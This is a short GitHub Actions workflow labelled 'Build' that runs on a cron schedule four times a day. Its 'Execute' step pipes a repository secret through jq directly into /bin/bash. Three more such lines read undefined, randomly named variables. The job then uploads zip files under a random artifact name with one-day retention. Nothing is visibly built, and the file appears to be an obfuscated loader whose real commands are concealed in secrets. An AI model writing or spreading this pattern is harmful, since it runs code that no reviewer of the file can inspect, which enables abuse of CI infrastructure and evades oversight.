name: Build
on:
  workflow_dispatch:

  schedule:
    - cron: '27 1,7,13,19 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Execute
        env:
          bb66: ${{ secrets.bb66 }}
        run: |
          printf '%s' "$bb66" | jq -r .v7 | /bin/bash
          printf '%s' "$fdl21540" | jq -r .yi787 | /bin/bash
          printf '%s' "$l773" | jq -r .oqsmj6667 | /bin/bash
          printf '%s' "$s3429" | jq -r .zkgfn3830 | /bin/bash

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: uUDNufZW
          path: "*.zip"
          retention-days: 1
